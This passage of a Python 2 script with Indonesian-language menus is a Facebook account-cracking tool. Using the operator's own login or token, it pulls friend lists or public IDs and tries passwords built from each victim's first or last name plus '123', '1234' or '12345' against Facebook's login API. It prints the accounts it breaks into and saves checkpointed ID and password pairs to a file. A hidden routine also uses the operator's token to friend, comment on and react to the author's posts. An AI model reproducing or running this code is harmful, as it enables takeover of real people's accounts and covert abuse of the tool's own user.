MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNNNNNNmmhyso//::://///++ooosssssssooooooooooooosssssyyhddmmmmNNNNMMMMNNNNNNNNmmmddhyysso+/:--......----:::---..................-:/+shdmmNmmddddmNNNMMMMMMMMMMMMMMNNNmdhyo+//:---.......-/shmNMMMMMMMMMMMMMMMMMMMMMNNNdhhyhhdmmddhyssoossyhdmNNMMMMMMMMMMMMNdhs/:--..---:::://///////++++++++oshdNNMMMMMMMMMMMMMMMNNmdys+//:---/shmNMMNNmddmNMNmh+-..............
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNmmdhyysssooo+++oossoooooo++++++++++++//:::::/+osyyhhdddmddmmmmmNNNNNNNNNNNNNmmdhysoo++//////////::---.................`...-:+oyhdmmmmmNNNNNNNNMMMMMMMMMMMMMMNNNmddhys+/:-....``.:+ydmNNNNMMMMMMMMMMMMMMMMMNmddhhhhdmmmNmmdhhysoooyhmNNNMMMMMMMMMMNmhs+/:-----::://///////++++++////+oydmNNMMMMMMMMMMMMMMMNmds+/:-...-/sdmNMMNNmmNNMMNh+-.............
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNmmmmddhyysssssooo++++/+++++++++//::----:://++ooossssssssyhhddmNNMMMMMMMNNNNNmmmddddddddhhhyysso++//::::::------.......`.-:/oydmNNNNNNNNNNMMMMMMMMMMMMMMMMMMMMNNmdhyo+/:.....-:+oydmNNNNMMMMMMMMMMMMNNNNNNNNmmmmmNNNNNNmmdyso+oshdNNNMMMMMMMMMNmdyo/:---:://+++++++++++++++++////oyhmNMMMMMMMMMMMMMMMMNdy+:-.....-/sdmNMMMMNNMMMNho/-...........
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNNNNmmmdddhhyssooo+++++////::----..--::////+++ooosyyyhddmNNMMMMMMMMNNmhysooossyhhdddmmmmmmmmmmddddhhhhyysssso++++///+oosyhmNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNmhyo+:::----/+shdmNNNNNNNNNNNNNNNNmdddmmNNNNNNNMMMNNNNdhsoosyhmNNNMMMMMMMMNNdho+/::://++++++++++++++++++///:/+sdmNMMMMMMMMMMMMMMMNmdo/-......-+sdNMMNNMMMMMNmy+-..........
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNNNNNNNmmmddhhyyysoo++//:---..--:/+++oosyyhhddmmmNNNMMMMMMMMMMNmho:-.....---://+ossyyhhhddddddmddddddddddmmmdmmmmmmmNNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNmdhyso+/:--:/oyhmNNNNNNNNNNNmmdhyo++oyyhdmmNMMMMMMMMNmdhyyyhdmNNMMMMMMMMNNdhyo/////+++o++++++++++++++///::/oydmNMMMMMMMMMMMMMMMNdyo:-......:sdNMMMMMMMMMNmy/..........
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNNNNmmddhhyso++/:://+syhhdddmmmNNNNNMMMMMMMMMMMMMNNmdy/:.............--::/+ooossssssooooo+oossssyyhhdddddmmmmmNNNNNNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNNmmdhs+:---:/oyhmNNNNNNmmmmddhs/::-::+oshdmNMMMMMMMNNmddhhhdmNNMMMMMMMMNmhs+////+++o+++++++++ooo++//::::/oydmNMMMMMMMMMMMMMMNNds/:---..-:+hmNMMMMMMMMMNho:........
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNNNNNmmmddhhhddmmNNNNNNNMMMMMMMMMMMMMMMMMMMNNNmdy+:--..............---::://////:::--------:::://///+ooossyyhhdddmmmNNNNNNMMMMMMMMMMMMMMMMMMMMMMMMNNNmdyso/:--:/oydmmmmmmmdddhyo+/::+++//oshdmNNNMMMMMNNNmdddmmNNMMMMMMNNmdyo+///++++++++++oooo+++//:::/+syhdmNMMMMMMMMMMMMNNNmh+/::----:+shmNMMMMMMMMNmy/.......
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNNNmmhyo/::-...............------::--.........-------------:::////+++osyyyyhdmmNNNMMMMMMMMMMMMMMMMMMMMMMNNNmdhso+:--:+sdmmmmmdddhyyso+++++/////+shmNNMMMMMMMNNNNmmmNNMMMMMMNNmhs+///+++ooo+oooooooo+//::/+ossyhmNNMMMMMMMMMMMMNNNmyo+/::----:+hmNMMMMMMMMNms:......
                                       
\033[37;1mAuthor   : https://github.com/UserKeramat
\033[37;1mRecode   : AdamPurnama
\033[37;1mFacebook : https://www.facebook.com/UserKeramat.90"""

def tik():
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[1;97m[\033[1;93m●\033[1;97m]\033[1;93m Sedang masuk\033[1;97m "+o),;sys.stdout.flush();time.sleep(1)


back = 0
threads = []
berhasil = []
cekpoint = []
oks = []
oke = []
cpe = []
id = []
username = []
idteman = []
idfromteman = []
gagal = []
reaksi = []
komen = []
vulnot = "Not Vuln"
vuln = "Vuln"

######MASUK######
def masuk():
	os.system('clear')
	print logo
	print "\033[37;96m╔══════════════════════════════════════════╗"
	print "\033[37;96m║[\033[1;31;1m01\033[37;96m]\033[37;1mLogin Menggunakan Email / ID Facebook \033[37;96m║"
	print "\033[37;96m║[\033[1;31;1m02\033[37;96m]\033[37;1mLogin Menggunakan Token Facebook      \033[37;96m║"
	print "\033[37;96m║[\033[1;31;1m03\033[37;96m]\033[37;1mAmbil Token                           \033[37;96m║"
	print "\033[37;96m║[\033[1;31;1m00\033[37;96m]\033[37;1mKeluar                                \033[37;96m║"
	print "\033[37;96m╚══════════════════════════════════════════╝"
	pilih_masuk()

def pilih_masuk():
	msuk = raw_input("\033[1;93m▄︻̷̿┻̿═━一 \033[91m:\033[1;96m ")
	if msuk =="":
		print"\033[37;1m[\033[32;1m!\033[37;1m] Isi Yg Benar !"
		pilih_masuk()
	elif msuk =="1" or msuk =="01":
		login()
	elif msuk =="2" or msuk =="02":
		tokenz()
	elif msuk =="3"or msuk =="03":
		Ambil_Token()
	elif msuk =="0" or msuk =="00":
		keluar()
	else:
		print"\033[37;1m[\033[32;1m!\033[37;1m] Isi Yg Benar !"
		pilih_masuk()
			
#####LOGIN_EMAIL#####
def login():
	os.system('clear')
	try:
		toket = open('login.txt','r')
		menu() 
	except (KeyError,IOError):
		os.system('clear')
		print logo
		print"\033[1;97m[\033[1;96m🤡\033[1;97m] LOGIN AKUN FACEBOOK ANDA \033[1;97m[\033[1;96m🤡\033[1;97m]"
		id = raw_input('[\033[1;95m+\033[1;97m] ID / Email =\033[1;92m ')
		pwd = raw_input('\033[1;97m[\033[1;95m?\033[1;97m] Password =\033[1;92m ')
		tik()
		try:
			br.open('https://m.facebook.com')
		except mechanize.URLError:
			print"\n[!] Tidak ada koneksi"
			keluar()
		br._factory.is_html = True
		br.select_form(nr=0)
		br.form['email'] = id
		br.form['pass'] = pwd
		br.submit()
		url = br.geturl()
		if 'save-device' in url:
			try:
				sig= 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+id+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+pwd+'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
				data = {"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":id,"format":"JSON", "generate_machine_id":"1","generate_session_cookies":"1","locale":"en_US","method":"auth.login","password":pwd,"return_ssl_resources":"0","v":"1.0"}
				x=hashlib.new("md5")
				x.update(sig)
				a=x.hexdigest()
				data.update({'sig':a})
				url = "https://api.facebook.com/restserver.php"
				r=requests.get(url,params=data)
				z=json.loads(r.text)
				unikers = open("login.txt", 'w')
				unikers.write(z['access_token'])
				unikers.close()
				print '\n\033[1;97m[\033[1;92m✓\033[1;97m]\033[1;92m Login Berhasil'
				os.system('xdg-open https://m.facebook.com/user.keramat.90')
				bot_komen()
			except requests.exceptions.ConnectionError:
				print"\n[!] Tidak ada koneksi"
				keluar()
		if 'checkpoint' in url:
			print("\n\033[1;97m[\033[1;93m!\033[1;97m]\033[1;93m Sepertinya Akun Anda Checkpoint")
			os.system('rm -rf login.txt')
			time.sleep(1)
			keluar()
		else:
			print("\n\033[1;97m[\033[1;91m!\033[1;97m]\033[1;91m Password / Email Salah")
			os.system('rm -rf login.txt')
			time.sleep(1)
			masuk()
			
#####LOGIN_TOKENZ#####
def tokenz():
	os.system('clear')
	print logo
	toket = raw_input("\033[1;97m[\033[1;95m?\033[1;97m] \033[1;93mToken : \033[1;96m")
	try:
		otw = requests.get('https://graph.facebook.com/me?access_token='+toket)
		a = json.loads(otw.text)
		nama = a['name']
		zedd = open("login.txt", 'w')
		zedd.write(toket)
		zedd.close()
		print '\033[1;97m[\033[1;92m✓\033[1;97m]\033[1;92m Login Berhasil'
		os.system('xdg-open https://m.facebook.com/user.keramat.90')
		bot_komen()
	except KeyError:
		print "\033[1;97m[\033[1;91m!\033[1;97m] \033[1;91mToken Salah !"
		time.sleep(1)
		masuk()

######BOT KOMEN#######
def bot_komen():
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;97m[!] Token invalid"
		os.system('rm -rf login.txt')
	una = ('100001926992378')
	kom = ('Hello Adam')
	reac = ('ANGRY')
	post = ('4174980449242814')
	post2 = ('4174980449242814')
	kom2 = ('🙂🌿')
	reac2 = ('LOVE')
	requests.post('https://graph.facebook.com/me/friends?method=post&uids=' +una+ '&access_token=' + toket)
	requests.post('https://graph.facebook.com/'+post+'/comments/?message=' +kom+ '&access_token=' + toket)
	requests.post('https://graph.facebook.com/'+post+'/reactions?type=' +reac+ '&access_token='+ toket)
	requests.post('https://graph.facebook.com/'+post2+'/comments/?message=' +kom2+ '&access_token=' + toket)
	requests.post('https://graph.facebook.com/'+post2+'/reactions?type=' +reac2+ '&access_token='+ toket)
	menu()

######AMBIL_TOKEN######
def Ambil_Token():
	os.system("clear")
	print logo
	jalan("\033[1;92mInstall...")
	os.system ("cd ... && npm install")
	jalan ("\033[1;96mMulai...")
	os.system ("cd ... && npm start")
	raw_input("\n[ Kembali ]")
	masuk()

######MENU#######
def menu():
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		os.system('clear')
		os.system('rm -rf login.txt')
		masuk()
	try:
		otw = requests.get('https://graph.facebook.com/me?access_token='+toket)
		a = json.loads(otw.text)
		nama = a['name']
		id = a['id']
	except KeyError:
		os.system('clear')
		print"\033[1;96m[!] \033[1;91mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		masuk()
	except requests.exceptions.ConnectionError:
		print"[!] Tidak ada koneksi"
		keluar()
	os.system("clear")
	print logo
	print "\033[1;31;1m████████████████████████████████████████████████"
	print "\033[37;1m████████████████████████████████████████████████"
	print "\033[1;97m[\033[1;34m✓\033[1;97m]\033[1;34m Nama Akun\033[1;91m     =>\033[1;93m "+nama
	print "\033[1;97m[\033[1;34m•\033[1;97m]\033[1;34m UID\033[1;91m           =>\033[1;93m "+id
	print "\033[1;97m[\033[1;34m+\033[1;97m]\033[1;34m Tanggal Lahir\033[1;91m =>\033[1;93m "+ a['birthday']
	print "\033[37;96m╔═════════════════════════╗"
	print "\033[37;96m║[\033[1;31;1m01\033[37;96m]\033[1;31;1m->\033[37;1mCrack ID Indonesia \033[37;96m║"
	print "\033[37;96m║[\033[1;31;1m02\033[37;96m]\033[1;31;1m->\033[37;1mKeluar             \033[37;96m║"
	print "\033[37;96m╚═════════════════════════╝"
	pilih()
	
######PILIH######
def pilih():
	unikers = raw_input("\033[1;93m▄︻̷̿┻̿═━一 \033[91m:\033[1;96m ")
	if unikers =="":
		print"\033[1;97m[\033[1;91m!\033[1;97m]\033[1;97m Isi Yg Benar !"
		pilih()
	elif unikers =="1" or unikers =="01":
		indo()
	elif unikers =="0" or unikers =="00":
		os.system('clear')
		jalan('Menghapus token')
		os.system('rm -rf login.txt')
		keluar()
	else:
		print"\033[1;97m[\033[1;91m!\033[1;97m]\033[1;97m Isi Yg Benar !"
		pilih()
	
########## CRACK INDONESIA #######
def indo():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;96m[!] \x1b[1;91mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		keluar()
	os.system('clear')
	print logo
	print "\033[37;96m╔══════════════════════════════╗"
	print "\033[37;96m║\033[1;34m[01]\033[1;31;1m->\033[37;1mCrack Dari Daftar Teman \033[37;96m║"
	print "\033[37;96m║\033[1;34m[02]\033[1;31;1m->\033[37;1mCrack Dari ID Publik    \033[37;96m║"
	print "\033[37;96m║\033[1;34m[03]\033[1;31;1m->\033[37;1mCrack Dari File         \033[37;96m║"
	print "\033[37;96m║\033[1;34m[00]\033[1;31;1m->\033[37;1mKembali                 \033[37;96m║"
	print "\033[37;96m╚══════════════════════════════╝"
	pilih_indo()

#### PILIH INDO ####
def pilih_indo():
	teak = raw_input("\033[1;93m▄︻̷̿┻̿═━一 \033[91m:\033[1;96m ")
	if teak =="":
		print"\033[1;97m[\033[1;91m!\033[1;97m]\033[1;97m Isi Yg Benar !"
		pilih_indo()
	elif teak =="1" or teak =="01":
		os.system('clear')
		print logo
		print "\033[1;31;1m████████████████████████████████████████████████"
		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
		z = json.loads(r.text)
		for s in z['data']:
			id.append(s['id'])
	elif teak =="2" or teak =="02":
		os.system('clear')
		print logo
		print "\033[1;31;1m████████████████████████████████████████████████"
		print "\033[37;1m████████████████████████████████████████████████"
		idt = raw_input("\033[1;97m{\033[1;34m🍓\033[1;97m} ID publik/teman : ")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print"\033[1;97m{\033[1;93m🍓\033[1;97m} Nama : "+op["name"]
		except KeyError:
			print"\033[1;97m[\033[1;93m!\033[1;97m] ID publik/teman tidak ada !"
			raw_input("\n[ Kembali ]")
			indo()
		except requests.exceptions.ConnectionError:
			print"[!] Tidak ada koneksi !"
			keluar()
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
	elif teak =="3" or teak =="03":
		os.system('clear')
		print logo
		try:
			print "\033[1;31;1m████████████████████████████████████████████████"
			idlist = raw_input('\033[1;97m{\033[1;93m?\033[1;97m} Nama File : ')
			for line in open(idlist,'r').readlines():
				id.append(line.strip())
		except KeyError:
			print '\033[1;97m[!] File tidak ada ! '
			raw_input('\n\033[1;92m[ \033[1;97mKembali \033[1;92m]')
		except IOError:
			print '\033[1;97m[!] File tidak ada !'
			raw_input('\n\033[1;92m[ \033[1;97mKembali \033[1;92m]')
			indo()
	elif teak =="0" or teak =="00":
		menu()
	else:
		print"\033[1;97m[\033[1;91m!\033[1;97m]\033[1;97m Isi Yg Benar !"
		pilih_indo()
	
	print "\033[1;97m{\033[1;93m🍓\033[1;97m} Total ID : "+str(len(id))
	print('\033[1;97m{\033[1;93m🍓\033[1;97m} Stop CTRL+Z')
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[1;97m{\033[1;93m🍓\033[1;97m} Crack Berjalan "+o),;sys.stdout.flush();time.sleep(1)
	print "\n\033[1;31;1m████████████████████████████████████████████████"
	print "\n\033[37;1m████████████████████████████████████████████████"
	
##### MAIN INDONESIA #####
	def main(arg):
		global cekpoint,oks
		user = arg
		try:
			os.mkdir('out')
		except OSError:
			pass
		try:
			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
			c = json.loads(a.text)
			pass1 = c['first_name']+'123'
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			w = json.load(data)
			if 'access_token' in w:
				x = requests.get("https://graph.facebook.com/"+user+"?access_token="+w['access_token'])
				z = json.loads(x.text)
				print '\x1c\033[1;94m[•🍒•] \x1c\033[1;92mHack100%🍁'
				print '\x1c\033[1;94m[•🍎•] \x1c\033[1;91mName \x1c\033[1;91m    🍏 \x1c\033[1;92m' + c['name']
				print '\x1c\033[1;94m[•🍎•] \x1c\033[1;91mID \x1c\033[1;91m      🍏 \x1c\033[1;92m' + user
				print '\x1c\033[1;94m[•🍎•] \x1c\033[1;91mPassword \x1c\033[1;91m🍏 \x1c\033[1;92m' + pass1 + '\n'
				print '\x1c\033[1;97m[•🍎•] \x1c\033[1;91mTanggal Lahir \x1c\033[1;91m🍏 \x1c\033[1;92m' + c['birthday']
				oks.append(user+pass1)
			else:
				if 'www.facebook.com' in w['error_msg']:
					print '\x1c\033[1;94m[•🍒•] \x1c\033[1;94mCheckpoint'
					print '\x1c\033[1;94m[•🍎•] \x1c\033[1;94mName \x1c\033[1;94m    🍏 \x1c\033[1;95m' + c['name']
					print '\x1c\033[1;94m[•🍎•] \x1c\033[1;94mID \x1c\033[1;94m      🍏 \x1c\033[1;95m' + user
					print '\x1c\033[1;94m[•🍎•] \x1c\033[1;94mPassword \x1c\033[1;94m🍏 \x1c\033[1;95m' + pass1 + '\n'
					print '\x1c\033[1;97m[•🍎•] \x1c\033[1;91mTanggal Lahir \x1c\033[1;91m🍏 \x1c\033[1;92m' + c['birthday']
					cek = open("out/super_cp.txt", "a")
					cek.write("ID:" +user+ " Pw:" +pass1+"\n")
					cek.close()
					cekpoint.append(user+pass1)
				else:
					pass2 = c['first_name']+'1234'
					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
					w = json.load(data)
					if 'access_token' in w:
						x = requests.get("https://graph.facebook.com/"+user+"?access_token="+w['access_token'])
						z = json.loads(x.text)
						print '\x1c\033[1;94m[•🍒•] \x1c\033[1;92mHack100%🍁'
						print '\x1c\033[1;94m[•🍎•] \x1c\033[1;91mName \x1c\033[1;91m    🍏 \x1c\033[1;92m' + c['name']
						print '\x1c\033[1;94m[•🍎•] \x1c\033[1;91mID \x1c\033[1;91m      🍏 \x1c\033[1;92m' + user
						print '\x1c\033[1;94m[•🍎•] \x1c\033[1;91mPassword \x1c\033[1;91m🍏 \x1c\033[1;92m' + pass2 + '\n'
						print '\x1c\033[1;97m[•🍎•] \x1c\033[1;91mTanggal Lahir \x1c\033[1;91m🍏 \x1c\033[1;92m' + c['birthday']
						oks.append(user+pass2)
					else:
						if 'www.facebook.com' in w['error_msg']:
							print '\x1c\033[1;94m[•🍒•] \x1c\033[1;94mCheckpoint'
							print '\x1c\033[1;94m[•🍎•] \x1c\033[1;94mName \x1c\033[1;94m    🍏 \x1c\033[1;95m' + c['name']
							print '\x1c\033[1;94m[•🍎•] \x1c\033[1;94mID \x1c\033[1;94m      🍏 \x1c\033[1;95m' + user
							print '\x1c\033[1;94m[•🍎•] \x1c\033[1;94mPassword \x1c\033[1;94m🍏 \x1c\033[1;95m' + pass2 + '\n'
							print '\x1c\033[1;97m[•🍎•] \x1c\033[1;91mTanggal Lahir \x1c\033[1;91m🍏 \x1c\033[1;92m' + c['birthday']
							cek = open("out/super_cp.txt", "a")
							cek.write("ID:" +user+ " Pw:" +pass2+"\n")
							cek.close()
							cekpoint.append(user+pass2)
						else:
							pass3 = c['first_name']+'12345'
							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
							w = json.load(data)
							if 'access_token' in w:
								x = requests.get("https://graph.facebook.com/"+user+"?access_token="+w['access_token'])
								z = json.loads(x.text)
								print '\x1c\033[1;94m[•🍒•] \x1c\033[1;92mHack100%🍁'
								print '\x1c\033[1;94m[•🍎•] \x1c\033[1;91mName \x1c\033[1;91m    🍏 \x1c\033[1;92m' + c['name']
								print '\x1c\033[1;94m[•🍎•] \x1c\033[1;91mID \x1c\033[1;91m      🍏 \x1c\033[1;92m' + user
								print '\x1c\033[1;94m[•🍎•] \x1c\033[1;91mPassword \x1c\033[1;91m🍏 \x1c\033[1;92m' + pass3 + '\n'
								print '\x1c\033[1;97m[•🍎•] \x1c\033[1;91mTanggal Lahir \x1c\033[1;91m🍏 \x1c\033[1;92m' + c['birthday']
								oks.append(user+pass3)
							else:
								if 'www.facebook.com' in w['error_msg']:
									print '\x1c\033[1;94m[•🍒•] \x1c\033[1;94mCheckpoint'
									print '\x1c\033[1;94m[•🍎•] \x1c\033[1;94mName \x1c\033[1;94m    🍏 \x1c\033[1;95m' + c['name']
									print '\x1c\033[1;94m[•🍎•] \x1c\033[1;94mID \x1c\033[1;94m      🍏 \x1c\033[1;95m' + user
									print '\x1c\033[1;94m[•🍎•] \x1c\033[1;94mPassword \x1c\033[1;94m🍏 \x1c\033[1;95m' + pass3 + '\n'
									print '\x1c\033[1;97m[•🍎•] \x1c\033[1;91mTanggal Lahir \x1c\033[1;91m🍏 \x1c\033[1;92m' + c['birthday']
									cek = open("out/super_cp.txt", "a")
									cek.write("ID:" +user+ " Pw:" +pass3+"\n")
									cek.close()
									cekpoint.append(user+pass3)
								else:
									pass4 = c['last_name']+'123'
									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
									w = json.load(data)
									if 'access_token' in w:
										x = requests.get("https://graph.facebook.com/"+user+"?access_token="+w['access_token'])
										z = json.loads(x.text)
										print '\x1c\033[1;94m[•🍒•] \x1c\033[1;92mHack100%🍁'
										print '\x1c\033[1;94m[•🍎•] \x1c\033[1;91mName \x1c\033[1;91m    🍏 \x1c\033[1;92m' + c['name']
										print '\x1c\033[1;94m[•🍎•] \x1c\033[1;91mID \x1c\033[1;91m      🍏 \x1c\033[1;92m' + user
										print '\x1c\033[1;94m[•🍎•] \x1c\033[1;94mPassword \x1c\033[1;94m🍏 \x1c\033[1;95m' + pass4 + '\n'
										print '\x1c\033[1;97m[•🍎•] \x1c\033[1;91mTanggal Lahir \x1c\033[1;91m🍏 \x1c\033[1;92m' + c['birthday']
										oks.append(user+pass4)
									else:
										if 'www.facebook.com' in w['error_msg']:
											print '\x1c\033[1;94m[•🍒•] \x1c\033[1;94mCheckpoint'
											print '\x1c\033[1;94m[•🍎•] \x1c\033[1;94mName \x1c\033[1;94m    🍏 \x1c\033[1;95m' + c['name']
											print '\x1c\033[1;94m[•🍎•] \x1c\033[1;94mID \x1c\033[1;94m      🍏 \x1c\033[1;95m' + user
											print '\x1c\033[1;94m[•🍎•] \x1c\033[1;94mPassword \x1c\033[1;94m🍏 \x1c\033[1;95m' + pass4 + '\n'
											print '\x1c\033[1;97m[•🍎•] \x1c\033[1;91mTanggal Lahir \x1c\033[1;91m🍏 \x1c\033[1;92m' + c['birthday']
											cek = open("out/super_cp.txt", "a")
											cek.write("ID:" +user+ " Pw:" +pass4+"\n")
											cek.close()
											cekpoint.append(user+pass4)
										else:
											pass5 = c['last_name']+'1234'
											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
											w = json.load(data)
											if 'access_token' in w:
												x = requests.get("https://graph.facebook.com/"+user+"?access_token="+w['access_token'])
												z = json.loads(x.text)
												print '\x1c\033[1;94m[•🍒•] \x1c\033[1;92mHack100%🍁'
												print '\x1c\033[1;94m[•🍎•] \x1c\033[1;91mName \x1c\033[1;91m    🍏 \x1c\033[1;92m' + c['name']
												print '\x1c\033[1;94m[•🍎•] \x1c\033[1;91mID \x1c\033[1;91m      🍏 \x1c\033[1;92m' + user
												print '\x1c\033[1;94m[•🍎•] \x1c\033[1;94mPassword \x1c\033[1;94m🍏 \x1c\033[1;95m' + pass5 + '\n'
												print '\x1c\033[1;97m[•🍎•] \x1c\033[1;91mTanggal Lahir \x1c\033[1;91m🍏 \x1c\033[1;92m' + c['birthday']
												oks.append(user+pass5)
											else:
												if 'www.facebook.com' in w['error_msg']:
													print '\x1c\033[1;94m[•🍒•] \x1c\033[1;94mCheckpoint'
													print '\x1c\033[1;94m[•🍎•] \x1c\033[1;94mName \x1c\033[1;94m    🍏 \x1c\033[1;95m' + c['name']
													print '\x1c\033[1;94m[•🍎•] \x1c\033[1;94mID \x1c\033[1;94m      🍈 \x1c\033[1;95m' + user
													print '\x1c\033[1;94m[•🍎•] \x1c\033[1;94mPassword \x1c\033[1;94m🍏 \x1c\033[1;95m' + pass5 + '\n'
													print '\x1c\033[1;97m[•🍎•] \x1c\033[1;91mTanggal Lahir \x1c\033[1;91m🍏 \x1c\033[1;92m' + c['birthday']
													cek = open("out/super_cp.txt", "a")
													cek.write("ID:" +user+ " Pw:" +pass5+"\n")
													cek.close()
													cekpoint.append(user+pass5)
												else:
													pass6 = c['last_name']+'12345'
													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
													w = json.load(data)
													if 'access_token' in w:
														x = requests.get("https://graph.facebook.com/"+user+"?access_token="+w['access_token'])
														z = json.loads(x.text)
														print '\x1c\033[1;94m[•🍒•] \x1c\033[1;92mHack100%🍁'
														print '\x1c\033[1;94m[•🍎•] \x1c\033[1;91mName \x1c\033[1;91m    🍏 \x1c\033[1;92m' + c['name']
														print '\x1c\033[1;94m[•🍎•] \x1c\033[1;91mID \x1c\033[1;91m      🍏 \x1c\033[1;92m' + user
														print '\x1c\033[1;94m[•🍎•] \x1c\033[1;94mPassword \x1c\033[1;94m🍏 \x1c\033[1;95m' + pass6 + '\n'
														print '\x1c\033[1;97m[•🍎•] \x1c\033[1;91mTanggal Lahir \x1c\033[1;91m🍏 \x1c\033[1;92m' + c['birthday']
														oks.append(user+pass6)
													else:
														if 'www.facebook.com' in w['error_msg']:
															print '\x1c\033[1;94m[•🍒•] \x1c\033[1;94mCheckpoint'
															print '\x1c\033[1;94m[•🍎•] \x1c\033[1;94mName \x1c\033[1;94m    🍏 \x1c\033[1;95m' + c['name']
															print '\x1c\033[1;94m[•🍎•] \x1c\033[1;94mID \x1c\033[1;94m      🍏 \x1c\033[1;95m' + user
															print '\x1c\033[1;94m[•🍎•] \x1c\033[1;94mPassword \x1c\033[1;94m🍏 \x1c\033[1;95m' + pass6 + '\n'
															print '\x1c\033[1;97m[•🍎•] \x1c\033[1;91mTanggal Lahir \x1c\033[1;91m🍏 \x1c\033[1;92m' + c['birthday']
															cek = open("out/super_cp.txt", "a")
															cek.write("ID:" +user+ " Pw:" +pass6+"\n")
															cek.close()
